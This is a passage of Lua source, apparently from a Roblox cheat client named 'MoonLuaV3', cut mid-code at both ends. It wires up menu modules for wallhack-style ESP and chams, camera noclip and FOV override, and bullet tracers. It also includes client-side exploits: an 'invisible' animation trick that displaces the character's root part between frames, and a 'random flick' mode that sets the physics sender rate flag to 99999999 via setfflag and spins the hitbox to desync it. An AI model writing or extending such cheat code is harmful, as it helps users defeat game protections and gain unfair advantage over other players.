									Texture = "rbxassetid://7071778278",
									Brightness = 1.5,
									Transparency = NumberSequence.new(0.7),
									LightEmission = 1,
									LightInfluence = 0,
									Segments = 1,
									TextureLength = 12,
									TextureMode = Enum.TextureMode.Wrap,
									TextureSpeed = 1,
									Width0 = 0.6,
									Width1 = 0.6,
									FaceCamera = true,
								},
							},
						},
					}

					local function fn20()
						if tbl4.Camera.FovConnection then
							Disconnect(tbl4.Camera.FovConnection)
							tbl4.Camera.FovConnection = nil
						end
					end

					local function fn21(arg)
						if not tbl4.Camera.Module:Get() or not arg then
							return
						end
						fn20()
						arg.FieldOfView = tbl4.Camera.Fov

						tbl4.Camera.FovConnection = Connect(GetPropertyChangedSignal(arg, "FieldOfView"), function()
							if tbl4.Camera.Module:Get() and arg.FieldOfView ~= tbl4.Camera.Fov then
								arg.FieldOfView = tbl4.Camera.Fov
							end
						end)
					end

					local function fn22(arg)
						local v19 = Camera()

						if arg then
							if v19 and tbl4.Camera.OriginalFov == nil then
								tbl4.Camera.OriginalFov = v19.FieldOfView
							end

							fn21(v19)
						else
							fn20()

							if v19 and tbl4.Camera.OriginalFov ~= nil then
								v19.FieldOfView = tbl4.Camera.OriginalFov
							end

							tbl4.Camera.OriginalFov = nil
						end
					end

					local function fn23()
						if tbl4.Camera.OcclusionConnection then
							Disconnect(tbl4.Camera.OcclusionConnection)
							tbl4.Camera.OcclusionConnection = nil
						end
					end

					local function fn24()
						fn23()
						LocalPlayer.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam

						tbl4.Camera.OcclusionConnection = Connect(GetPropertyChangedSignal(LocalPlayer, "DevCameraOcclusionMode"), function()
							if tbl4.Camera.Module:Get() and tbl4.Camera.Noclip and LocalPlayer.DevCameraOcclusionMode ~= Enum.DevCameraOcclusionMode.Invisicam then
								LocalPlayer.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam
							end
						end)
					end

					local function fn25(arg)
						if arg then
							if tbl4.Camera.OriginalOcclusionMode == nil then
								tbl4.Camera.OriginalOcclusionMode = LocalPlayer.DevCameraOcclusionMode
							end

							fn24()
						else
							fn23()
							LocalPlayer.DevCameraOcclusionMode = tbl4.Camera.OriginalOcclusionMode or Enum.DevCameraOcclusionMode.Zoom
							tbl4.Camera.OriginalOcclusionMode = nil
						end
					end

					Connect(GetPropertyChangedSignal(workspace, "CurrentCamera"), function()
						tbl4.Camera.SmoothPosition = nil
						fn22(tbl4.Camera.Module:Get())
						fn25(tbl4.Camera.Module:Get() and tbl4.Camera.Noclip)
					end)

					local function fn26(arg)
						local v19 = Camera()
						if not tbl4.Camera.Module:Get() or not tbl4.Camera.Smooth.Enabled or not v19 then
							tbl4.Camera.SmoothPosition = nil
							return
						end
						local cFrame = v19.CFrame
						local position = cFrame.Position

						if not tbl4.Camera.SmoothPosition then
							tbl4.Camera.SmoothPosition = position
						else
							local v20 = Clamp(arg * tbl4.Camera.Smooth.Speed, 0, 1)
							tbl4.Camera.SmoothPosition = tbl4.Camera.SmoothPosition:Lerp(position, v20)
						end

						v19.CFrame = NewCFrame(tbl4.Camera.SmoothPosition, tbl4.Camera.SmoothPosition + cFrame.LookVector)
					end

					tbl4.ESP = v17:CreateModule({
						Id = "render-esp",
						Name = "ESP",
						Callback = function(arg)
							if arg then
								lib2:Start()
								lib2:SetEnabled(true)
							else
								lib2:Destroy()
							end
						end,
					})

					tbl4.ESP:CreateToggle({
						Id = "ESP.Config.Name",
						Name = "Name",
						Default = lib2.Config.Name,
						Callback = function(name)
							lib2.Config.Name = name
						end,
					})

					tbl4.ESP:CreateToggle({
						Id = "ESP.Config.Health",
						Name = "Health",
						Default = lib2.Config.Health,
						Callback = function(health)
							lib2.Config.Health = health
						end,
					})

					tbl4.ESP:CreateToggle({
						Id = "ESP.Config.Distance",
						Name = "Distance",
						Default = lib2.Config.Distance,
						Callback = function(distance)
							lib2.Config.Distance = distance
						end,
					})

					tbl4.ESP:CreateToggle({
						Id = "ESP.Config.Tool",
						Name = "Tool",
						Default = lib2.Config.Tool,
						Callback = function(tool)
							lib2.Config.Tool = tool
						end,
					})

					tbl4.ESP:CreateToggle({
						Id = "ESP.Config.HealthBar",
						Name = "HealthBar",
						Default = lib2.Config.HealthBar,
						Callback = function(healthBar)
							lib2.Config.HealthBar = healthBar
						end,
					})

					tbl4.ESP:CreateToggle({
						Id = "ESP.Config.OnlyEnemy",
						Name = "Only Enemy",
						Default = lib2.Config.OnlyEnemy,
						Callback = function(onlyEnemy)
							lib2.Config.OnlyEnemy = onlyEnemy
						end,
					})

					tbl4.ESP:CreateToggle({
						Id = "ESP.Config.Flags",
						Name = "Flags",
						Default = lib2.Config.Flags,
						Callback = function(flags)
							lib2.Config.Flags = flags
						end,
					})

					tbl4.ESP:CreateColorPicker({
						Id = "ESP.Config.BoxColor",
						Name = "Box Color",
						Default = lib2.Config.BoxColor,
						Nested = true,
						Parent = tbl4.ESP:CreateToggle({
							Id = "ESP.Config.Boxes",
							Name = "Boxes",
							Default = lib2.Config.Boxes,
							Callback = function(boxes)
								lib2.Config.Boxes = boxes
							end,
						}),
						Callback = function(boxColor)
							lib2.Config.BoxColor = boxColor
						end,
					})

					tbl4.ESP:CreateColorPicker({
						Id = "ESP.Config.WhitelistColor",
						Name = "Whitelist Color",
						Default = lib2.Config.WhitelistColor,
						Callback = function(whitelistColor)
							lib2.Config.WhitelistColor = whitelistColor
						end,
					})

					tbl4.ESP:CreateColorPicker({
						Id = "ESP.Config.BlacklistColor",
						Name = "Blacklist Color",
						Default = lib2.Config.BlacklistColor,
						Callback = function(blacklistColor)
							lib2.Config.BlacklistColor = blacklistColor
						end,
					})

					tbl4.ESP:CreateColorPicker({
						Id = "ESP.Config.HealthHighColor",
						Name = "Health High Color",
						Default = lib2.Config.HealthHighColor,
						Callback = function(healthHighColor)
							lib2.Config.HealthHighColor = healthHighColor
						end,
					})

					tbl4.ESP:CreateColorPicker({
						Id = "ESP.Config.HealthLowColor",
						Name = "Health Low Color",
						Default = lib2.Config.HealthLowColor,
						Callback = function(healthLowColor)
							lib2.Config.HealthLowColor = healthLowColor
						end,
					})

					tbl4.ESP:CreateToggle({
						Id = "ESP.Config.Chams",
						Name = "Chams",
						Default = lib2.Config.Chams,
						Callback = function(chams)
							lib2.Config.Chams = chams
						end,
					})

					local v19 = tbl4.ESP:CreateToggle({
						Id = "ESP.Config.ChamsOutline",
						Name = "Outline",
						Default = lib2.Config.ChamsOutline,
						Callback = function(chamsOutline)
							lib2.Config.ChamsOutline = chamsOutline
						end,
					})

					tbl4.ESP:CreateColorPicker({
						Id = "ESP.Config.ChamsOutlineColor",
						Name = "Outline Color",
						Default = lib2.Config.ChamsOutlineColor,
						Nested = true,
						Parent = v19,
						Callback = function(chamsOutlineColor)
							lib2.Config.ChamsOutlineColor = chamsOutlineColor
						end,
					})

					tbl4.ESP:CreateSlider({
						Id = "ESP.Config.ChamsOutlineAlpha",
						Name = "Outline Alpha",
						Min = 0,
						Max = 1,
						Default = lib2.Config.ChamsOutlineAlpha,
						Step = 0.01,
						Nested = true,
						Parent = v19,
						Callback = function(chamsOutlineAlpha)
							lib2.Config.ChamsOutlineAlpha = chamsOutlineAlpha
						end,
					})

					tbl4.ESP:CreateSlider({
						Id = "ESP.Config.ChamsOutlineSize",
						Name = "Outline Size",
						Min = 0.01,
						Max = 1,
						Default = lib2.Config.ChamsOutlineSize,
						Step = 0.01,
						Nested = true,
						Parent = v19,
						Callback = function(chamsOutlineSize)
							lib2.Config.ChamsOutlineSize = chamsOutlineSize
						end,
					})

					local v20 = tbl4.ESP:CreateToggle({
						Id = "ESP.Config.ChamsInline",
						Name = "Inline",
						Default = lib2.Config.ChamsInline,
						Callback = function(chamsInline)
							lib2.Config.ChamsInline = chamsInline
						end,
					})

					tbl4.ESP:CreateColorPicker({
						Id = "ESP.Config.ChamsInlineColor",
						Name = "Inline Color",
						Default = lib2.Config.ChamsInlineColor,
						Nested = true,
						Parent = v20,
						Callback = function(chamsInlineColor)
							lib2.Config.ChamsInlineColor = chamsInlineColor
						end,
					})

					tbl4.ESP:CreateSlider({
						Id = "ESP.Config.ChamsInlineAlpha",
						Name = "Inline Alpha",
						Min = 0,
						Max = 1,
						Default = lib2.Config.ChamsInlineAlpha,
						Step = 0.01,
						Nested = true,
						Parent = v20,
						Callback = function(chamsInlineAlpha)
							lib2.Config.ChamsInlineAlpha = chamsInlineAlpha
						end,
					})

					tbl4.ESP:CreateSlider({
						Id = "ESP.Config.ChamsInlineSize",
						Name = "Inline Size",
						Min = 0.01,
						Max = 0.5,
						Default = lib2.Config.ChamsInlineSize,
						Step = 0.01,
						Nested = true,
						Parent = v20,
						Callback = function(chamsInlineSize)
							lib2.Config.ChamsInlineSize = chamsInlineSize
						end,
					})

					tbl4.Camera.Module = v17:CreateModule({
						Id = "render-camera",
						Name = "Camera",
						Callback = function(arg)
							if arg then
								RunService:BindToRenderStep("MoonLuaV3SmoothCamera", Enum.RenderPriority.Camera.Value + 1, fn26)
								fn22(true)
								fn25(tbl4.Camera.Noclip)
							else
								RunService:UnbindFromRenderStep("MoonLuaV3SmoothCamera")
								fn22(false)
								fn25(false)
								tbl4.Camera.SmoothPosition = nil
							end
						end,
					})

					tbl4.Camera.Module:CreateToggle({
						Id = "render-camera-noclip",
						Name = "Noclip",
						Default = tbl4.Camera.Noclip,
						Callback = function(noclip)
							tbl4.Camera.Noclip = noclip
							fn25(tbl4.Camera.Module:Get() and noclip)
						end,
					})

					tbl4.Camera.Module:CreateSlider({
						Id = "render-camera-fov",
						Name = "FOV",
						Min = 1,
						Max = 120,
						Default = tbl4.Camera.Fov,
						Step = 1,
						Callback = function(fov)
							tbl4.Camera.Fov = fov

							if tbl4.Camera.Module:Get() and Camera() then
								Camera().FieldOfView = fov
							end
						end,
					})

					tbl4.Camera.Module:CreateSlider({
						Id = "render-camera-smooth-value",
						Name = "Speed",
						Min = 1,
						Max = 20,
						Default = tbl4.Camera.Smooth.Speed,
						Step = 1,
						Nested = true,
						Parent = tbl4.Camera.Module:CreateToggle({
							Id = "render-camera-smooth",
							Name = "Smooth",
							Default = tbl4.Camera.Smooth.Enabled,
							Callback = function(enabled)
								tbl4.Camera.Smooth.Enabled = enabled

								if not enabled then
									tbl4.Camera.SmoothPosition = nil
								end
							end,
						}),
						Callback = function(speed)
							tbl4.Camera.Smooth.Speed = speed
						end,
					})

					local function fn27()
						local instance = tbl4.World.Instance
						if instance and instance.Parent then
							return instance
						end
						local ColorCorrectionEffect = FindFirstChild(Lighting, "MoonLuaWorldColorCorrection")

						if not ColorCorrectionEffect or not IsA(ColorCorrectionEffect, "ColorCorrectionEffect") then
							ColorCorrectionEffect = NewInstance("ColorCorrectionEffect")
							ColorCorrectionEffect.Name = "MoonLuaWorldColorCorrection"
							ColorCorrectionEffect.Parent = Lighting
						end

						tbl4.World.Instance = ColorCorrectionEffect
						return ColorCorrectionEffect
					end

					local function fn28()
						local v21 = fn27()
						local v22 = tbl4.World.Module:Get()
						v21.Enabled = v22

						if v22 then
							v21.TintColor = tbl4.World.Color
							v21.Brightness = tbl4.World.Brightness
							v21.Contrast = tbl4.World.Contrast
							v21.Saturation = tbl4.World.Saturation
						else
							v21.TintColor = NewColor3(1, 1, 1)
							v21.Brightness = 0
							v21.Contrast = 0
							v21.Saturation = 0
						end
					end

					tbl4.World.Module = v17:CreateModule({
						Id = "render-world",
						Name = "World",
						Callback = function()
							fn28()
						end,
					})

					local function fn29(arg, arg2, arg3)
						tbl4.World.Module:CreateSlider({
							Id = "RenderState.World." .. arg,
							Name = arg2,
							NameKey = arg3,
							Min = 0,
							Max = 1,
							Default = tbl4.World[arg],
							Step = 0.01,
							Callback = function(arg4)
								tbl4.World[arg] = arg4
								fn28()
							end,
						})
					end

					tbl4.World.Module:CreateColorPicker({
						Id = "RenderState.World.Color",
						Name = "Color",
						Default = tbl4.World.Color,
						Opened = true,
						Callback = function(color)
							tbl4.World.Color = color
							fn28()
						end,
					})

					fn29("Brightness", "Brightness", "render_world_brightness")
					fn29("Contrast", "Contrast", "render_world_contrast")
					fn29("Saturation", "Saturation", "render_world_saturation")
					fn28()

					for k, v21 in next, tbl4.BulletTracer.Tracerlist, nil do
						tbl4.BulletTracer.Tracers[k] = {
							Texture = v21.Texture,
							Width0 = v21.Width0,
							Create = function(position, position2, arg, arg2, width0)
								local Attachment = NewInstance("Attachment", workspace.Terrain)
								local Attachment2 = NewInstance("Attachment", workspace.Terrain)
								Attachment.Position = position
								Attachment2.Position = position2
								local Beam = NewInstance("Beam", workspace.Terrain)

								for k2, v22 in pairs(v21) do
									Beam[k2] = v22
								end

								Beam.Attachment0 = Attachment
								Beam.Attachment1 = Attachment2
								Beam.Color = ColorSequence.new(arg)
								Beam.Width0 = width0
								Beam.Width1 = width0
								Debris:AddItem(Attachment, arg2)
								Debris:AddItem(Attachment2, arg2)
								Debris:AddItem(Beam, arg2)

								Delay(arg2 * 0.5, function()
									TweenService:Create(Beam, TweenInfo.new(arg2 * 0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Width0 = Beam.Width0 * 0.9, Width1 = Beam.Width1 * 0.9 }):Play()
									local NumberValue = NewInstance("NumberValue")
									NumberValue.Value = 0.45

									Connect(GetPropertyChangedSignal(NumberValue, "Value"), function()
										Beam.Transparency = NumberSequence.new(NumberValue.Value)
									end)

									local v22
									TweenService:Create(NumberValue, v22, { Value = 1 }):Play()
								end)
							end,
						}
					end

					CreateTracer = function(arg, arg2, arg3, arg4)
						if not tbl4.BulletTracer.Module:Get() then
							return
						end
						local v21 = tbl4.BulletTracer.Tracers[tbl4.BulletTracer.Tracer]

						if v21 and v21.Create then
							v21.Create(arg, arg2, arg4 and tbl4.BulletTracer.EnemyColor or tbl4.BulletTracer.SelfColor, arg3 or tbl4.BulletTracer.Time, v21.Width0)
						end
					end

					tbl4.BulletTracer.Module = v17:CreateModule({ Id = "render-bullet-tracer", Name = "Bullet Tracer", Default = true })

					tbl4.BulletTracer.Module:CreateSelector({
						Id = "RenderState.BulletTracer.Tracer",
						Name = "Mode",
						Options = { { Value = "Obelus" }, { Value = "Lightning" }, { Value = "DNA" } },
						Default = tbl4.BulletTracer.Tracer,
						Callback = function(tracer)
							tbl4.BulletTracer.Tracer = tracer
						end,
					})

					tbl4.BulletTracer.Module:CreateColorPicker({
						Id = "RenderState.BulletTracer.SelfColor",
						Name = "Self Color",
						Default = tbl4.BulletTracer.SelfColor,
						Opened = true,
						Callback = function(selfColor)
							tbl4.BulletTracer.SelfColor = selfColor
						end,
					})

					tbl4.BulletTracer.Module:CreateColorPicker({
						Id = "RenderState.BulletTracer.EnemyColor",
						Name = "Enemy Color",
						Default = tbl4.BulletTracer.EnemyColor,
						Opened = true,
						Callback = function(enemyColor)
							tbl4.BulletTracer.EnemyColor = enemyColor
						end,
					})

					tbl4.BulletTracer.Module:CreateSlider({
						Id = "RenderState.BulletTracer.Time",
						Name = "Time",
						Min = 1,
						Max = 10,
						Default = tbl4.BulletTracer.Time,
						Step = 1,
						Callback = function(time)
							tbl4.BulletTracer.Time = time
						end,
					})

					v17:CreateModule({
						Id = "render-hitlog",
						Name = "Hitlog",
						Default = hitlogEnabled,
						Callback = function(arg)
							hitlogEnabled = arg
						end,
					})

					local v21 = v14:CreateTab({ Id = "tab-misc", Name = "Misc" })
					local tbl5 = { Animation = { Module = nil, Mode = "R6 Hide Head" } }

					local tbl6 = {
						Connection = nil,
						RenderBound = false,
						HideHeadTrack = nil,
						HideHeadLastHumanoid = nil,
						HideHeadAnim = nil,
						InvisibleTrack = nil,
						InvisibleSavedCFrame = nil,
						InvisibleAnim = nil,
						SpamTrack1 = nil,
						SpamTrack2 = nil,
						SpamAnim1 = nil,
						SpamAnim2 = nil,
						SpamAngle = 0,
						SpamLastHumanoid = nil,
						SpamLastFFlagTime = 0,
						SpamSpinSpeed = 100,
						SpamTimePosRatio = 0.5,
						R15Track = nil,
						R15LastHumanoid = nil,
						R15Anim = nil,
					}

					local function fn30()
						local character = LocalPlayer.Character
						return character and FindFirstChildOfClass(character, "Humanoid")
					end

					local function fn31(parent)
						if not parent then
							return nil
						end
						local Animator = FindFirstChildOfClass(parent, "Animator")

						if not Animator then
							Animator = NewInstance("Animator")
							Animator.Parent = parent
						end

						return Animator
					end

					local function fn32(arg)
						if arg then
							pcall(function()
								arg:Stop(0)
							end)
						end
					end

					local function fn33()
						local character = LocalPlayer.Character
						if not character then
							return
						end
						local v22 = GetChildren(character)

						for i = 1, #v22 do
							local v23 = v22[i]

							if IsA(v23, "BasePart") and v23.Transparency == 0.5 then
								v23.Transparency = 0
							end
						end
					end

					local function fn34()
						if tbl6.Connection then
							Disconnect(tbl6.Connection)
							tbl6.Connection = nil
						end

						RunService:UnbindFromRenderStep("MoonLuaV3AnimationRenderFix")
						RunService:UnbindFromRenderStep("MoonLuaV3LuanFeiAnimFix")
						RunService:UnbindFromRenderStep("MoonLuaV3AnimationRestoreCFrame")

						if tbl6.RenderBound then
							tbl6.RenderBound = false
						end

						fn32(tbl6.HideHeadTrack)
						fn32(tbl6.InvisibleTrack)
						fn32(tbl6.SpamTrack1)
						fn32(tbl6.SpamTrack2)
						fn32(tbl6.R15Track)
						tbl6.HideHeadTrack = nil
						tbl6.HideHeadLastHumanoid = nil
						tbl6.InvisibleTrack = nil
						tbl6.InvisibleSavedCFrame = nil
						tbl6.SpamTrack1 = nil
						tbl6.SpamTrack2 = nil
						tbl6.SpamAngle = 0
						tbl6.SpamLastHumanoid = nil
						tbl6.SpamLastFFlagTime = 0
						tbl6.R15Track = nil
						tbl6.R15LastHumanoid = nil
						fn33()
					end

					local function fn35(arg, arg2, priority, arg3, arg4)
						local v22 = fn30()
						if not v22 or v22.Health <= 0 then
							return arg2
						end
						local flag = false

						if arg2 then
							local result4

							flag, result4 = pcall(function()
								return arg2.IsPlaying
							end)

							flag = flag and result4 == true
						end

						if not flag then
							local v23 = fn31(v22)
							if not v23 then
								return arg2
							end
							fn32(arg2)

							local ok4, result4 = pcall(function()
								return v23:LoadAnimation(arg)
							end)

							if ok4 and result4 then
								arg2 = result4
								arg2.Priority = priority or Enum.AnimationPriority.Action
								arg2.Looped = true
								arg2:Play(0, 1, arg3 or 1)
							end
						end

						if arg2 then
							pcall(function()
								if arg3 then
									arg2:AdjustSpeed(arg3)
								end

								if arg4 then
									arg2.TimePosition = arg4(arg2)
								end
							end)
						end

						return arg2
					end

					local function fn36()
						tbl6.HideHeadAnim = tbl6.HideHeadAnim or NewInstance("Animation")
						tbl6.HideHeadAnim.AnimationId = "rbxassetid://68339848"

						tbl6.Connection = Connect(RunService.Heartbeat, function()
							local v22 = fn30()

							if tbl6.HideHeadLastHumanoid ~= v22 then
								fn32(tbl6.HideHeadTrack)
								tbl6.HideHeadTrack = nil
								tbl6.HideHeadLastHumanoid = v22
							end

							tbl6.HideHeadTrack = fn35(tbl6.HideHeadAnim, tbl6.HideHeadTrack, Enum.AnimationPriority.Action, 0, function(arg)
								return arg.Length > 0 and arg.Length or 0
							end)
						end)
					end

					local function fn37()
						tbl6.R15Anim = tbl6.R15Anim or NewInstance("Animation")
						tbl6.R15Anim.AnimationId = "rbxassetid://102325931762962"

						tbl6.Connection = Connect(RunService.Heartbeat, function()
							local v22 = fn30()

							if tbl6.R15LastHumanoid ~= v22 then
								fn32(tbl6.R15Track)
								tbl6.R15Track = nil
								tbl6.R15LastHumanoid = v22
							end

							tbl6.R15Track = fn35(tbl6.R15Anim, tbl6.R15Track, Enum.AnimationPriority.Action, 1)

							if tbl6.R15Track then
								pcall(function()
									tbl6.R15Track:AdjustWeight(1, 0)
								end)
							end
						end)
					end

					local function fn38()
						tbl6.InvisibleAnim = tbl6.InvisibleAnim or NewInstance("Animation")
						tbl6.InvisibleAnim.AnimationId = "rbxassetid://282574440"

						tbl6.Connection = Connect(RunService.Heartbeat, function()
							local character = LocalPlayer.Character
							local v22 = character and FindFirstChildOfClass(character, "Humanoid")
							local v23 = character and FindFirstChild(character, "HumanoidRootPart")
							if not v22 or not v23 or v22.Health <= 0 then
								return
							end

							tbl6.InvisibleTrack = fn35(tbl6.InvisibleAnim, tbl6.InvisibleTrack, Enum.AnimationPriority.Action, 0, function()
								return 0.3
							end)

							tbl6.InvisibleSavedCFrame = v23.CFrame
							v23.CFrame = tbl6.InvisibleSavedCFrame + NewVector3(0, -2, 0)
						end)

						RunService:BindToRenderStep("MoonLuaV3AnimationRenderFix", 199, function()
							local character = LocalPlayer.Character
							local v22 = character and FindFirstChild(character, "HumanoidRootPart")

							if v22 and tbl6.InvisibleSavedCFrame then
								v22.CFrame = tbl6.InvisibleSavedCFrame
								tbl6.InvisibleSavedCFrame = nil
							end

							fn32(tbl6.InvisibleTrack)
							tbl6.InvisibleTrack = nil

							if character then
								local v23 = GetChildren(character)

								for i = 1, #v23 do
									local v24 = v23[i]

									if IsA(v24, "BasePart") and (v24.Name == "Head" or v24.Name == "Torso" or v24.Name:match("Arm") or v24.Name:match("Leg")) then
										v24.Transparency = 0.5
									end
								end
							end
						end)

						tbl6.RenderBound = true
					end

					local function fn39()
						tbl6.SpamAnim1 = tbl6.SpamAnim1 or NewInstance("Animation")
						tbl6.SpamAnim1.AnimationId = "rbxassetid://215384594"
						tbl6.SpamAnim2 = tbl6.SpamAnim2 or NewInstance("Animation")
						tbl6.SpamAnim2.AnimationId = "rbxassetid://68339848"

						RunService:BindToRenderStep("MoonLuaV3LuanFeiAnimFix", 199, function()
							if tbl5.Animation ~= "R6 Random Flick" then
								return
							end

							if tbl6.SpamTrack1 then
								pcall(function()
									tbl6.SpamTrack1:Stop(0)
								end)
							end

							if tbl6.SpamTrack2 then
								pcall(function()
									tbl6.SpamTrack2:Stop(0)
								end)
							end
						end)

						tbl6.RenderBound = true

						tbl6.Connection = Connect(RunService.Heartbeat, function()
							local now = tick()

							if now - tbl6.SpamLastFFlagTime >= 1 then
								tbl6.SpamLastFFlagTime = now

								pcall(function()
									setfflag("S2PhysicsSenderRate", "99999999")
								end)
							end

							local v22 = fn30()
							if not v22 or v22.Health <= 0 then
								return
							end

							if tbl6.SpamLastHumanoid ~= v22 then
								fn32(tbl6.SpamTrack1)
								fn32(tbl6.SpamTrack2)
								tbl6.SpamTrack1 = nil
								tbl6.SpamTrack2 = nil
								tbl6.SpamLastHumanoid = v22
							end

							local v23 = FindFirstChildOfClass(v22, "Animator") or v22

							if not tbl6.SpamTrack1 then
								pcall(function()
									tbl6.SpamTrack1 = v23:LoadAnimation(tbl6.SpamAnim1)
									tbl6.SpamTrack1.Priority = Enum.AnimationPriority.Action4
								end)
							end

							if not tbl6.SpamTrack2 then
								pcall(function()
									tbl6.SpamTrack2 = v23:LoadAnimation(tbl6.SpamAnim2)
									tbl6.SpamTrack2.Priority = Enum.AnimationPriority.Action4
									tbl6.SpamTrack2.Looped = true
								end)
							end

							if tbl6.SpamTrack1 then
								pcall(function()
									if not tbl6.SpamTrack1.IsPlaying then
										tbl6.SpamTrack1:Play()
									end

									tbl6.SpamTrack1:AdjustSpeed(0)
									tbl6.SpamTrack1.TimePosition = tbl6.SpamTrack1.Length > 0 and tbl6.SpamTimePosRatio * tbl6.SpamTrack1.Length or tbl6.SpamTimePosRatio
								end)
							end

							if tbl6.SpamTrack2 then
								pcall(function()
									if not tbl6.SpamTrack2.IsPlaying then
										tbl6.SpamTrack2:Play()
									end

									tbl6.SpamTrack2:AdjustSpeed(1)
								end)
							end

							tbl6.SpamAngle = tbl6.SpamAngle + tbl6.SpamSpinSpeed
							local character = LocalPlayer.Character
							local v24 = character and FindFirstChild(character, "HumanoidRootPart")
							if not v24 then
								return
							end
							local cFrame = v24.CFrame
							local v25 = Rad
							local n4 = tbl6.SpamAngle * 0.8
							v24.CFrame = cFrame * Angles(Rad(tbl6.SpamAngle), Rad(tbl6.SpamAngle * 1.5), v25(n4))
							RunService:UnbindFromRenderStep("MoonLuaV3AnimationRestoreCFrame")

							RunService:BindToRenderStep("MoonLuaV3AnimationRestoreCFrame", 199, function()
								if character and v24 and v24.Parent then
									v24.CFrame = cFrame
								end

								RunService:UnbindFromRenderStep("MoonLuaV3AnimationRestoreCFrame")
							end)
						end)
					end

					local function fn40(arg)
						fn34()

						if arg == "R6 Hide Head" then
							fn36()
						elseif arg == "R6 Invisible" then
							fn38()
						elseif arg == "R6 Random Flick" then
							fn39()
						elseif arg == "R15 Hide Head/Leg" then
							fn37()
						end
					end

					tbl5.Animation.Module = v21:CreateModule({
						Id = "misc-animation",
						Name = "Animation",
						Callback = function(arg)
							fn34()

							if arg then
								fn40(tbl5.Animation.Mode)
							end
						end,
					})

					tbl5.Animation.Module:CreateKeybind({
						Id = "misc-animation-keybind",
						Name = "Keybind",
						Callback = function()
							tbl5.Animation.Module:Set(not tbl5.Animation.Module:Get())
						end,
					})

					tbl5.Animation.Module:CreateSelector({
						Id = "MiscState.Animation.Mode",
						Name = "Mode",
						Options = {
							{ Value = "R6 Hide Head" },
							{ Value = "R6 Invisible" },
							{ Value = "R6 Random Flick" },
							{ Value = "R15 Hide Head/Leg" },
						},
						Default = tbl5.Animation.Mode,
						Callback = function(mode)
							tbl5.Animation.Mode = mode
							fn34()

							if tbl5.Animation.Module:Get() then
								fn40(mode)
							end
						end,
					})

					local meshId = "rbxassetid://1095708"
					local meshId2 = "rbxassetid://101851696"
					local textureId = "rbxassetid://101851254"
					local v22 = NewRGB(64, 64, 64)
					local name = "KorbloxLeg"
					local tbl7 = { CharacterAdded = nil, Snapshot = nil }

					local function fn41()
						if tbl7.CharacterAdded then
							Disconnect(tbl7.CharacterAdded)
							tbl7.CharacterAdded = nil
						end
					end

					local function fn42(arg, arg2)
						local tbl8 = {}
						if not arg then
							return tbl8
						end
						local v23 = GetChildren(arg)

						for i = 1, #v23 do
							local v24 = v23[i]

							if IsA(v24, arg2) then
								Insert(tbl8, v24:Clone())
							end
						end

						return tbl8
					end

					local function fn43(arg)
						if not arg or tbl7.Snapshot and tbl7.Snapshot.Character == arg then
							return
						end
						local v23 = FindFirstChild(arg, "Head")
						local v24 = FindFirstChild(arg, "Right Leg")
						local v25 = FindFirstChild(arg, "RightUpperLeg")
						local v26 = v23 and (FindFirstChild(v23, "face") or FindFirstChildWhichIsA(v23, "Decal"))

						tbl7.Snapshot = {
							Character = arg,
							HeadTransparency = v23 and v23.Transparency or 0,
							HeadCanCollide = v23 and v23.CanCollide or false,
							HeadMeshes = fn42(v23, "SpecialMesh"),
							FaceTexture = v26 and v26.Texture or nil,
							RightLegColor = v24 and v24.Color or nil,
							RightLegMeshes = fn42(v24, "SpecialMesh"),
							RightLegCharacterMeshes = fn42(v24, "CharacterMesh"),
							RightUpperLegTransparency = v25 and v25.Transparency or 0,
							RightLowerLegTransparency = FindFirstChild(arg, "RightLowerLeg") and arg.RightLowerLeg.Transparency or 0,
							RightFootTransparency = FindFirstChild(arg, "RightFoot") and arg.RightFoot.Transparency or 0,
						}
					end

					local function fn44(arg)
						if not arg then
							return
						end
						local v23 = FindFirstChild(arg, "face") or FindFirstChildWhichIsA(arg, "Decal")

						if v23 then
							v23:Destroy()
						end
					end

					local function fn45(parent)
						if not parent then
							return
						end
						parent.Transparency = 1
						parent.CanCollide = false
						fn44(parent)
						local v23 = GetChildren(parent)

						for i = 1, #v23 do
							local v24 = v23[i]

							if IsA(v24, "SpecialMesh") then
								v24:Destroy()
							end
						end

						local SpecialMesh = NewInstance("SpecialMesh")
						SpecialMesh.MeshType = Enum.MeshType.FileMesh
						SpecialMesh.MeshId = meshId
						SpecialMesh.Scale = NewVector3(0.001, 0.001, 0.001)
						SpecialMesh.Parent = parent
					end

					local function fn46(arg)
						local v23 = FindFirstChild(arg, "Right Leg")
						if not v23 then
							return
						end
						local v24 = GetChildren(v23)

						for i = 1, #v24 do
							local v25 = v24[i]

							if IsA(v25, "SpecialMesh") or IsA(v25, "CharacterMesh") then
								v25:Destroy()
							end
						end

						v23.Color = v22
						local SpecialMesh = NewInstance("SpecialMesh")
						SpecialMesh.MeshType = Enum.MeshType.FileMesh
						SpecialMesh.MeshId = meshId2
						SpecialMesh.TextureId = textureId
						SpecialMesh.Scale = NewVector3(1, 1, 1)
						SpecialMesh.Parent = v23
					end

					local function fn47(parent)
						local v23 = FindFirstChild(parent, "RightUpperLeg")
						if not v23 then
							return
						end
						local v24 = FindFirstChild(parent, "KorbloxLeg")

						if v24 then
							v24:Destroy()
						end

						v23.Transparency = 1
						local v25 = FindFirstChild(parent, "RightLowerLeg")
						local v26 = FindFirstChild(parent, "RightFoot")

						if v25 then
							v25.Transparency = 1
						end

						if v26 then
							v26.Transparency = 1
						end

						local Part = NewInstance("Part")
						Part.Name = name
						Part.Size = NewVector3(1, 2, 1)
						Part.Anchored = false
						Part.CanCollide = false
						Part.Color = v22
						Part.Parent = parent
						local SpecialMesh = NewInstance("SpecialMesh")
						SpecialMesh.MeshType = Enum.MeshType.FileMesh
						SpecialMesh.MeshId = meshId2
						SpecialMesh.TextureId = textureId
						SpecialMesh.Scale = NewVector3(1, 1, 1)
						SpecialMesh.Parent = Part
						local Weld = NewInstance("Weld")
						Weld.Part0 = v23
						Weld.Part1 = Part
						Weld.C0 = NewCFrame(0, -0.8, 0)
						Weld.Parent = Part
					end

					local function fn48(arg)
						if not arg then
							return
						end
						fn43(arg)
						Wait(0.1)
						if not arg.Parent then
							return
						end
						fn45(FindFirstChild(arg, "Head"))
						local v23 = FindFirstChildOfClass(arg, "Humanoid")
						if not v23 then
							return
						end

						if v23.RigType == Enum.HumanoidRigType.R6 then
							fn46(arg)
						elseif v23.RigType == Enum.HumanoidRigType.R15 then
							fn47(arg)
						end
					end

					local function fn49(parent, arg)
						if not parent then
							return
						end
